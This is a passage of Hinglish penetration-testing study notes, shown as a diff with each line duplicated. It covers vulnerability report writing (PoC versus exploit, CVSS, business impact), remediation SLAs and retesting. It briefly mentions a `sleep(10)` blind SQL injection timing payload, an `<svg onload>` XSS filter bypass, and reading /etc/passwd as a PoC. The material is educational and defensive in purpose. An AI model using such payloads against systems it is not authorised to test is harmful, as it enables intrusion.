-[[HL::* **Actually:** **Exploit** woh weaponized script hai jo nuksan pahunchati hai (jaise malware). **PoC (Proof of Concept)** ek safe, benign demonstration hai jo sirf vulnerability ki existence prove karta hai bina system ko harm kiye (jaise `whoami` command chala ke dikhana ya `/etc/passwd` padhna, na ki system delete karna).::HL]]
-[[HL::* **Prove karo:** PoC code ko client server pe chalane se pehle review allow karta hai, exploit directly damage karta hai.::HL]]
+* **Confusion 1 — "PoC aur Exploit mein kya difference hai?"**
+* **Galat soch:** Dono same cheez hain — script jo system hack kare.
+* **Actually:** **Exploit** woh weaponized script hai jo nuksan pahunchati hai (jaise malware). **PoC (Proof of Concept)** ek safe, benign demonstration hai jo sirf vulnerability ki existence prove karta hai bina system ko harm kiye (jaise `whoami` command chala ke dikhana ya `/etc/passwd` padhna, na ki system delete karna).
+* **Prove karo:** PoC code ko client server pe chalane se pehle review allow karta hai, exploit directly damage karta hai.
 
 
-[[HL::* **Confusion 2 — "Technical Impact aur Business Impact alag hain kya?"**::HL]]
-[[HL::* **Galat soch:** Agar SQLi hai toh database dump hoga, wahi impact hai.::HL]]
-[[HL::* **Actually:** Technical impact hai "Database query altered". Business impact hai "Attacker can leak 1 million user records causing GDPR fines and loss of company stock value." Report mein business impact client ko action lene pe majboor karta hai.::HL]]
-[[HL::* **Prove karo:** Client ke CEO ko technical logs samajh nahi aate, usse paiso ka loss samajh aata hai.::HL]]
+* **Confusion 2 — "Technical Impact aur Business Impact alag hain kya?"**
+* **Galat soch:** Agar SQLi hai toh database dump hoga, wahi impact hai.
+* **Actually:** Technical impact hai "Database query altered". Business impact hai "Attacker can leak 1 million user records causing GDPR fines and loss of company stock value." Report mein business impact client ko action lene pe majboor karta hai.
+* **Prove karo:** Client ke CEO ko technical logs samajh nahi aate, usse paiso ka loss samajh aata hai.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`Report Status: Needs More Info (NMI) / Cannot Reproduce`**::HL]]
-[[HL::* **Root Cause:** Triage team tumhare steps follow karke bug trigger nahi kar paa rahi.::HL]]
-[[HL::* **Fix:** Ek screen recording video banao, ya curl command do jisko copy-paste karke exact same error aa jaye.::HL]]
+* **`Report Status: Needs More Info (NMI) / Cannot Reproduce`**
+* **Root Cause:** Triage team tumhare steps follow karke bug trigger nahi kar paa rahi.
+* **Fix:** Ek screen recording video banao, ya curl command do jisko copy-paste karke exact same error aa jaye.
 
 
-[[HL::* **`Report Status: Duplicate`**::HL]]
-[[HL::* **Root Cause:** Kisi aur pentester ne aapse pehle same endpoint par same bug submit kar diya hai.::HL]]
-[[HL::* **Fix:** Move on, next target dhundho. Speed (topic 1) improve karo.::HL]]
+* **`Report Status: Duplicate`**
+* **Root Cause:** Kisi aur pentester ne aapse pehle same endpoint par same bug submit kar diya hai.
+* **Fix:** Move on, next target dhundho. Speed (topic 1) improve karo.
 
 
 
-[[HL::### ⚖️ 13. Comparison (Vague Report vs Professional Report)::HL]]
+### ⚖️ 13. Comparison (Vague Report vs Professional Report)
 
-[[HL::| Feature | Amateur Report | Professional Report |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Title** | Bug in API | Insecure Direct Object Reference (IDOR) on /api/profile |::HL]]
-[[HL::| **Proof** | "Just change the ID parameter" | Exact HTTP Request/Response provided |::HL]]
-[[HL::| **Impact** | "Hacker can hack it" | "Leads to unauthorized PII disclosure, CVSS 7.5" |::HL]]
-[[HL::| **Remediation** | "Fix it" | "Implement RBAC and validate JWT claims against object ID" |::HL]]
+| Feature | Amateur Report | Professional Report |
+| --- | --- | --- |
+| **Title** | Bug in API | Insecure Direct Object Reference (IDOR) on /api/profile |
+| **Proof** | "Just change the ID parameter" | Exact HTTP Request/Response provided |
+| **Impact** | "Hacker can hack it" | "Leads to unauthorized PII disclosure, CVSS 7.5" |
+| **Remediation** | "Fix it" | "Implement RBAC and validate JWT claims against object ID" |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* **⚔️ Attack Phase:** Reporting::HL]]
-[[HL::* **📍 Kill Chain Position:** End of Engagement (Post-Exploitation)::HL]]
-[[HL::* **🔗 This connects to:** Vulnerability Management aur Patching cycle (Topic 3).::HL]]
-[[HL::* **🔄 Flow:** Validate Bug -> Calculate CVSS -> Draft Report -> Submit to Triage -> Await Remediation.::HL]]
+* **⚔️ Attack Phase:** Reporting
+* **📍 Kill Chain Position:** End of Engagement (Post-Exploitation)
+* **🔗 This connects to:** Vulnerability Management aur Patching cycle (Topic 3).
+* **🔄 Flow:** Validate Bug -> Calculate CVSS -> Draft Report -> Submit to Triage -> Await Remediation.
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Anatomy of a Good Report)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Anatomy of a Good Report)
 
-[[HL::```text::HL]]
-[[HL::[ VULNERABILITY REPORT ]::HL]]
-[[HL:: ├── Title & Description (Clear and concise)::HL]]
-[[HL:: ├── CVSS Severity Score (Numbers backing the claim)::HL]]
-[[HL:: ├── Business Impact (Why the CEO should care)::HL]]
-[[HL:: ├── Steps to Reproduce / PoC (How the Dev can see it)::HL]]
-[[HL:: │    ├── Step 1: Login::HL]]
-[[HL:: │    ├── Step 2: Inject Payload::HL]]
-[[HL:: │    └── Step 3: Observe Output::HL]]
-[[HL:: └── Remediation (How to fix it permanently)::HL]]
+```text
+[ VULNERABILITY REPORT ]
+ ├── Title & Description (Clear and concise)
+ ├── CVSS Severity Score (Numbers backing the claim)
+ ├── Business Impact (Why the CEO should care)
+ ├── Steps to Reproduce / PoC (How the Dev can see it)
+ │    ├── Step 1: Login
+ │    ├── Step 2: Inject Payload
+ │    └── Step 3: Observe Output
+ └── Remediation (How to fix it permanently)
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q:** CVSS v3.1 mein "Attack Vector: Network (AV:N)" aur "Attack Vector: Local (AV:L)" mein kya difference hai?::HL]]
-[[HL::* **A:** Network (AV:N) matlab attacker internet ke through remote exploit kar sakta hai (severity high hoti hai). Local (AV:L) matlab attacker ko machine ka physical access chahiye ya uske paas target pe pehle se shell hona chahiye exploit run karne ke liye.::HL]]
+* **Q:** CVSS v3.1 mein "Attack Vector: Network (AV:N)" aur "Attack Vector: Local (AV:L)" mein kya difference hai?
+* **A:** Network (AV:N) matlab attacker internet ke through remote exploit kar sakta hai (severity high hoti hai). Local (AV:L) matlab attacker ko machine ka physical access chahiye ya uske paas target pe pehle se shell hona chahiye exploit run karne ke liye.
 
 
-[[HL::* **Q:** Triage ka process kya hota hai bug bounty mein?::HL]]
-[[HL::* **A:** Jab hum report submit karte hain, platform ki internal security team (triage team) usse padhti hai, PoC reproduce karke bug ki validity aur severity confirm karti hai, aur valid hone par usse company ki dev team ko bhejti hai.::HL]]
+* **Q:** Triage ka process kya hota hai bug bounty mein?
+* **A:** Jab hum report submit karte hain, platform ki internal security team (triage team) usse padhti hai, PoC reproduce karke bug ki validity aur severity confirm karti hai, aur valid hone par usse company ki dev team ko bhejti hai.
 
 
-[[HL::* **Q:** Tumhare hisaab se ek PoC kaisa hona chahiye?::HL]]
-[[HL::* **A:** Ek PoC simple, step-by-step aur 100% reproducible hona chahiye. Usme exact HTTP requests, headers, parameters, aur account roles clearly defined hone chahiye taaki ek junior developer bhi usse reproduce kar sake.::HL]]
+* **Q:** Tumhare hisaab se ek PoC kaisa hona chahiye?
+* **A:** Ek PoC simple, step-by-step aur 100% reproducible hona chahiye. Usme exact HTTP requests, headers, parameters, aur account roles clearly defined hone chahiye taaki ek junior developer bhi usse reproduce kar sake.
 
 
-[[HL::* **Q:** Agar target pe Blind SQLi milti hai toh uska PoC kaise doge kyunki data toh screen pe dikhta nahi?::HL]]
-[[HL::* **A:** Main `sleep(10)` payload use karunga aur PoC mein dono HTTP requests ka response time compare karunga. Agar payload ke sath server 10 second delay se respond karta hai, toh woh valid PoC hai Blind SQLi ka.::HL]]
+* **Q:** Agar target pe Blind SQLi milti hai toh uska PoC kaise doge kyunki data toh screen pe dikhta nahi?
+* **A:** Main `sleep(10)` payload use karunga aur PoC mein dono HTTP requests ka response time compare karunga. Agar payload ke sath server 10 second delay se respond karta hai, toh woh valid PoC hai Blind SQLi ka.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"Bad report = unpatched bug + zero bounty. A great finding with a bad report gets ignored."::HL]]
+"Bad report = unpatched bug + zero bounty. A great finding with a bad report gets ignored."
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```::HL]]
-[[HL::🔑 Keywords Coverage Check — Vulnerability Reporting (CVSS & PoC)::HL]]
-[[HL::✅ Covered   : Reporting, CVSS, Common Vulnerability Scoring System, Proof of Concept, PoC, business impact, remediation, steps to reproduce, triage, severity, bug bounty report::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED    : (none)::HL]]
+```
+🔑 Keywords Coverage Check — Vulnerability Reporting (CVSS & PoC)
+✅ Covered   : Reporting, CVSS, Common Vulnerability Scoring System, Proof of Concept, PoC, business impact, remediation, steps to reproduce, triage, severity, bug bounty report
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED    : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 3. Remediation Timelines (Industry Standards)::HL]]
+### 🎯 3. Remediation Timelines (Industry Standards)
 
-[[HL::Is topic mein hum samjhenge ki report submit hone ke baad corporate duniya mein patching aur vulnerability management kaise kaam karti hai, aur SLA (Service Level Agreement) ke hisaab se issues fix karne ke industry standards kya hain.::HL]]
+Is topic mein hum samjhenge ki report submit hone ke baad corporate duniya mein patching aur vulnerability management kaise kaam karti hai, aur SLA (Service Level Agreement) ke hisaab se issues fix karne ke industry standards kya hain.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Hospital ke emergency room ka rule socho. Agar kisi ka accident hua hai aur khoon beh raha hai (Critical Vulnerability, jaise RCE), toh doctors sab kuch chhod kar usse turant surgery (patch) karte hain (24-48 hours). Par agar kisi ko sirf sardi-khansi hai (Low severity bug, jaise missing headers), toh usse dawai dekar aaram se theek hone ka time dete hain (30-90 days). Saari beemariyaan ek din mein fix nahi ho saktin.::HL]]
+Hospital ke emergency room ka rule socho. Agar kisi ka accident hua hai aur khoon beh raha hai (Critical Vulnerability, jaise RCE), toh doctors sab kuch chhod kar usse turant surgery (patch) karte hain (24-48 hours). Par agar kisi ko sirf sardi-khansi hai (Low severity bug, jaise missing headers), toh usse dawai dekar aaram se theek hone ka time dete hain (30-90 days). Saari beemariyaan ek din mein fix nahi ho saktin.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Remediation timelines refer to the industry-standard patching cycles governed by Service Level Agreements (SLAs), which dictate the maximum allowable time a development team has to patch a security finding based on its CVSS severity, followed by a retesting phase.::HL]]
-[[HL::* **Hinglish Simplification:** Bug milne ke baad developers ke paas usse fix karne ke liye kitna time (deadline/SLA) hota hai, aur fix hone ke baad pentester dobara check (retest) karta hai.::HL]]
+* **Precise English:** Remediation timelines refer to the industry-standard patching cycles governed by Service Level Agreements (SLAs), which dictate the maximum allowable time a development team has to patch a security finding based on its CVSS severity, followed by a retesting phase.
+* **Hinglish Simplification:** Bug milne ke baad developers ke paas usse fix karne ke liye kitna time (deadline/SLA) hota hai, aur fix hone ke baad pentester dobara check (retest) karta hai.
 
-[[HL::### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-[[HL::* **Problem:** Beginners expect karte hain ki report karte hi 2 ghante mein bug fix ho jayega, aur nahi hone par developers pe gussa hote hain.::HL]]
-[[HL::* **Solution:** Patching cycles aur SLAs samajhne se expectations clear hoti hain aur professional communication maintain hota hai.::HL]]
-[[HL::* **What breaks if we don't know this?** Tum follow-up emails bhej kar client ko pareshan karoge ya galat time pe retesting schedule kar loge jab fix live hi nahi hua hoga.::HL]]
-[[HL::* **✅ Kab use karo (Use in engagement when):** Post-engagement reporting phase mein aur debriefing meetings mein clients ko remediation timelines explain karte waqt.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Active exploitation phase mein inka koi kaam nahi hai.
+* **Problem:** Beginners expect karte hain ki report karte hi 2 ghante mein bug fix ho jayega, aur nahi hone par developers pe gussa hote hain.
+* **Solution:** Patching cycles aur SLAs samajhne se expectations clear hoti hain aur professional communication maintain hota hai.
+* **What breaks if we don't know this?** Tum follow-up emails bhej kar client ko pareshan karoge ya galat time pe retesting schedule kar loge jab fix live hi nahi hua hoga.
+* **✅ Kab use karo (Use in engagement when):** Post-engagement reporting phase mein aur debriefing meetings mein clients ko remediation timelines explain karte waqt.
+* **❌ Kab mat karo / Alternative prefer karo:** Active exploitation phase mein inka koi kaam nahi hai.
 
-[[HL::### 💡 7. Concept Visualization (Theory Topic ke liye)::HL]]
+### 💡 7. Concept Visualization (Theory Topic ke liye)
 
 
-[[HL::\n*(Yeh purely conceptual topic hai — isme koi exploit command nahi hai, isliye hum workflow ko visually samjhenge)*::HL]]
+\n*(Yeh purely conceptual topic hai — isme koi exploit command nahi hai, isliye hum workflow ko visually samjhenge)*
 
-[[HL::**The Patch Management & Retesting Flow:**::HL]]
+**The Patch Management & Retesting Flow:**
 
-[[HL::1. **Day 0: Report Submitted:** Pentester report bhejta hai.::HL]]
-[[HL::2. **Day 1: Triage & Prioritization:** Security team CVSS base pe bug ko prioritize karti hai.::HL]]
-[[HL::3. **SLA Clock Starts:**::HL]]
-[[HL::* **Critical (CVSS 9.0-10.0):** 24 - 48 hours SLA (Emergency hotfix).::HL]]
-[[HL::* **High (CVSS 7.0-8.9):** 7 - 14 days SLA.::HL]]
-[[HL::* **Medium (CVSS 4.0-6.9):** 30 - 60 days SLA.::HL]]
-[[HL::* **Low (CVSS 0.1-3.9):** 90+ days SLA (Backlog).::HL]]
+1. **Day 0: Report Submitted:** Pentester report bhejta hai.
+2. **Day 1: Triage & Prioritization:** Security team CVSS base pe bug ko prioritize karti hai.
+3. **SLA Clock Starts:**
+* **Critical (CVSS 9.0-10.0):** 24 - 48 hours SLA (Emergency hotfix).
+* **High (CVSS 7.0-8.9):** 7 - 14 days SLA.
+* **Medium (CVSS 4.0-6.9):** 30 - 60 days SLA.
+* **Low (CVSS 0.1-3.9):** 90+ days SLA (Backlog).
 
 
-[[HL::4. **Patch Deployed:** Developers code fix karte hain aur production mein deploy karte hain.::HL]]
-[[HL::5. **Retesting Phase:** Pentester wapas aakar same exploit try karta hai verify karne ke liye ki bug completely gaya ya nahi (bypass check).::HL]]
+4. **Patch Deployed:** Developers code fix karte hain aur production mein deploy karte hain.
+5. **Retesting Phase:** Pentester wapas aakar same exploit try karta hai verify karne ke liye ki bug completely gaya ya nahi (bypass check).
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective:** Red teamers/Bug hunters ko pata hota hai ki low/medium bugs jaldi fix nahi hote. Ek smart attacker ek purane unpatched low severity bug ko hold karke naye bugs ke sath chain (combine) karke ek Critical exploit bana sakta hai. Retesting mein bhi attackers bypass dhundhne ki koshish karte hain (e.g., `<script>` ban kiya toh `<svg onload>` try karenge).::HL]]
-[[HL::**🔵 Defender Perspective:** Defenders ke paas resources limited hote hain. Prioritization zaroori hai. PCI-DSS jaise compliance standards unhe majboor karte hain ki Critical/High bugs fix kiye bina woh payment process nahi kar sakte.::HL]]
+**🔴 Attacker Perspective:** Red teamers/Bug hunters ko pata hota hai ki low/medium bugs jaldi fix nahi hote. Ek smart attacker ek purane unpatched low severity bug ko hold karke naye bugs ke sath chain (combine) karke ek Critical exploit bana sakta hai. Retesting mein bhi attackers bypass dhundhne ki koshish karte hain (e.g., `<script>` ban kiya toh `<svg onload>` try karenge).
+**🔵 Defender Perspective:** Defenders ke paas resources limited hote hain. Prioritization zaroori hai. PCI-DSS jaise compliance standards unhe majboor karte hain ki Critical/High bugs fix kiye bina woh payment process nahi kar sakte.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Enterprise pentesting mein jab report deliver hoti hai, uske baad client "Remediation Phase" mein chala jata hai. Maan lo humein SQL Injection (Critical) mila. Client usse 2 din mein patch karega, aur humein email aayega "Please retest". Hum same sqlmap command wapas chalayenge. Agar woh fail hui, toh issue closed. Yeh corporate compliance (PCI-DSS, SOC2) maintain karne ke liye legal requirement hoti hai.::HL]]
+Enterprise pentesting mein jab report deliver hoti hai, uske baad client "Remediation Phase" mein chala jata hai. Maan lo humein SQL Injection (Critical) mila. Client usse 2 din mein patch karega, aur humein email aayega "Please retest". Hum same sqlmap command wapas chalayenge. Agar woh fail hui, toh issue closed. Yeh corporate compliance (PCI-DSS, SOC2) maintain karne ke liye legal requirement hoti hai.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Report submit karne ke next day client ko ping karna "Bounty kab doge / Bug fix kab karoge?".::HL]]
-[[HL::* **🤦 Why:** Enterprise development cycles (sprints) slow hoti hain. Code likhna, test karna aur deploy karna time leta hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** SLA timelines ki respect karo. Bug track karne ke liye platform (HackerOne/Jira) updates ka wait karo.::HL]]
-[[HL::* **⚡ Consequences:** Impatient behavior se client tumhare sath future contracts/engagements cancel kar dega.::HL]]
-[[HL::* **❌ Mistake:** Retesting mein bas original payload verify karke issue close kar dena.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Developers aksar "band-aid fixes" (jugaad) lagate hain. Retest mein payload ko encode karke, ya slightly modify karke (bypass technique) test karo.::HL]]
-[[HL::* **⚡ Consequences:** Agar bypass exist karta hai, toh target abhi bhi vulnerable rahega aur security illusion create hoga.::HL]]
+* **❌ Mistake:** Report submit karne ke next day client ko ping karna "Bounty kab doge / Bug fix kab karoge?".
+* **🤦 Why:** Enterprise development cycles (sprints) slow hoti hain. Code likhna, test karna aur deploy karna time leta hai.
+* **✅ The 'Pro' Way:** SLA timelines ki respect karo. Bug track karne ke liye platform (HackerOne/Jira) updates ka wait karo.
+* **⚡ Consequences:** Impatient behavior se client tumhare sath future contracts/engagements cancel kar dega.
+* **❌ Mistake:** Retesting mein bas original payload verify karke issue close kar dena.
+* **✅ The 'Pro' Way:** Developers aksar "band-aid fixes" (jugaad) lagate hain. Retest mein payload ko encode karke, ya slightly modify karke (bypass technique) test karo.
+* **⚡ Consequences:** Agar bypass exist karta hai, toh target abhi bhi vulnerable rahega aur security illusion create hoga.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "Patching aur Mitigation mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono ek hi cheez hain — bug ko theek karna.::HL]]
-[[HL::* **Actually:** **Patching** matlab root cause theek karna (developer ne code rewrite kiya). **Mitigation** matlab temporary defense lagana jab tak patch na aaye (jaise WAF rule add kar diya taaki attack block ho jaye, par code abhi bhi vulnerable hai).::HL]]
-[[HL::* **Prove karo:** Mitigation ko frequently bypass kiya ja sakta hai naye encodings use karke, par proper patch bypass nahi hota.::HL]]
+* **Confusion 1 — "Patching aur Mitigation mein kya farq hai?"**
+* **Galat soch:** Dono ek hi cheez hain — bug ko theek karna.
+* **Actually:** **Patching** matlab root cause theek karna (developer ne code rewrite kiya). **Mitigation** matlab temporary defense lagana jab tak patch na aaye (jaise WAF rule add kar diya taaki attack block ho jaye, par code abhi bhi vulnerable hai).
+* **Prove karo:** Mitigation ko frequently bypass kiya ja sakta hai naye encodings use karke, par proper patch bypass nahi hota.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`Retesting shows the vulnerability is still exploitable`**::HL]]
-[[HL::* **Root Cause:** Developer ne siraf exact payload block kiya hai (blacklist filtering), underlying logic theek nahi kiya.::HL]]
-[[HL::* **Fix:** Report reopen karo, bypass payload provide karo, aur samjhao ki blacklist ki jagah whitelist/parameterized queries use karein.::HL]]
+* **`Retesting shows the vulnerability is still exploitable`**
+* **Root Cause:** Developer ne siraf exact payload block kiya hai (blacklist filtering), underlying logic theek nahi kiya.
+* **Fix:** Report reopen karo, bypass payload provide karo, aur samjhao ki blacklist ki jagah whitelist/parameterized queries use karein.
 
 
 
-[[HL::### ⚖️ 13. Comparison (SLA Priority)::HL]]
+### ⚖️ 13. Comparison (SLA Priority)
 
-[[HL::| Severity Level | Example Bug | Typical SLA Timeline |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Critical** | RCE, SQLi | 24 to 48 Hours |::HL]]
-[[HL::| **High** | IDOR, Stored XSS | 1 to 2 Weeks |::HL]]
-[[HL::| **Medium** | CSRF, Reflected XSS | 30 to 60 Days |::HL]]
-[[HL::| **Low** | Missing Security Headers | 90 Days or Accepted Risk |::HL]]
+| Severity Level | Example Bug | Typical SLA Timeline |
+| --- | --- | --- |
+| **Critical** | RCE, SQLi | 24 to 48 Hours |
+| **High** | IDOR, Stored XSS | 1 to 2 Weeks |
+| **Medium** | CSRF, Reflected XSS | 30 to 60 Days |
+| **Low** | Missing Security Headers | 90 Days or Accepted Risk |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* **⚔️ Attack Phase:** Reporting / Post-Engagement::HL]]
-[[HL::* **📍 Kill Chain Position:** Final Step (Post-Report Lifecycle)::HL]]
-[[HL::* **🔗 This connects to:** Vulnerability Management programs aur next year ke pentest scope.::HL]]
-[[HL::* **🔄 Flow:** Report Delivered -> Prioritized by CVSS -> Dev fixes within SLA -> Pentester Retests.::HL]]
+* **⚔️ Attack Phase:** Reporting / Post-Engagement
+* **📍 Kill Chain Position:** Final Step (Post-Report Lifecycle)
+* **🔗 This connects to:** Vulnerability Management programs aur next year ke pentest scope.
+* **🔄 Flow:** Report Delivered -> Prioritized by CVSS -> Dev fixes within SLA -> Pentester Retests.
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q:** Ek enterprise environment mein SLA (Service Level Agreement) ka security bugs ke context mein kya role hota hai?::HL]]
-[[HL::* **A:** SLA ek formal agreement hota hai jo define karta hai ki kisi severity level ke bug ko kitne time frame mein fix hona lazmi hai (jaise Critical ke liye 48 hours). Yeh accountability set karta hai aur compliance maintain karta hai.::HL]]
+* **Q:** Ek enterprise environment mein SLA (Service Level Agreement) ka security bugs ke context mein kya role hota hai?
+* **A:** SLA ek formal agreement hota hai jo define karta hai ki kisi severity level ke bug ko kitne time frame mein fix hona lazmi hai (jaise Critical ke liye 48 hours). Yeh accountability set karta hai aur compliance maintain karta hai.
 
 
-[[HL::* **Q:** Agar tum retesting kar rahe ho aur tumhe pata chale ki XSS ka fix bypass ho gaya hai, toh tumhara next step kya hoga?::HL]]
-[[HL::* **A:** Main original ticket ko reopen karunga, naya bypass PoC attach karunga, aur developer ko samjhaunga ki sirf `<script>` tag ko block karna in-sufficient tha, unhe context-aware output encoding implement karni chahiye.::HL]]
+* **Q:** Agar tum retesting kar rahe ho aur tumhe pata chale ki XSS ka fix bypass ho gaya hai, toh tumhara next step kya hoga?
+* **A:** Main original ticket ko reopen karunga, naya bypass PoC attach karunga, aur developer ko samjhaunga ki sirf `<script>` tag ko block karna in-sufficient tha, unhe context-aware output encoding implement karni chahiye.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"Understand developers can't fix everything in one day. Critical = Emergency 24 hrs, Low = Backlog 90 days."::HL]]
+"Understand developers can't fix everything in one day. Critical = Emergency 24 hrs, Low = Backlog 90 days."
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```::HL]]
-[[HL::🔑 Keywords Coverage Check — Remediation Timelines (Industry Standards)::HL]]
-[[HL::✅ Covered   : Remediation timeline, Service Level Agreement, SLA, patching cycles, retesting, vulnerability management, triage, prioritization::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED    : (none)::HL]]
+```
+🔑 Keywords Coverage Check — Remediation Timelines (Industry Standards)
+✅ Covered   : Remediation timeline, Service Level Agreement, SLA, patching cycles, retesting, vulnerability management, triage, prioritization
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED    : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 FINAL GRAND CHECKLIST::HL]]
+### 🏁 FINAL GRAND CHECKLIST
 
-[[HL::* Total Sections: 1 ✅::HL]]
-[[HL::* Total Topics: 3 ✅::HL]]
-[[HL::* Total Subtopics: 9 ✅::HL]]
-[[HL::* Total Keywords: 31::HL]]
-[[HL::* Keywords Covered: 31 ✅::HL]]
-[[HL::* CVEs Covered: 0 ✅::HL]]
-[[HL::* Keywords Missed: 0::HL]]
+* Total Sections: 1 ✅
+* Total Topics: 3 ✅
+* Total Subtopics: 9 ✅
+* Total Keywords: 31
+* Keywords Covered: 31 ✅
+* CVEs Covered: 0 ✅
+* Keywords Missed: 0
 
-[[HL::> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, aur har tool command. Koi bhi offensive security term censor nahi kiya gaya. Poora Section 17 perfectly wrap up ho chuka hai! 🚀::HL]]
+> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, aur har tool command. Koi bhi offensive security term censor nahi kiya gaya. Poora Section 17 perfectly wrap up ho chuka hai! 🚀
 
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::==================================================================================::HL]]
+==================================================================================
 
 
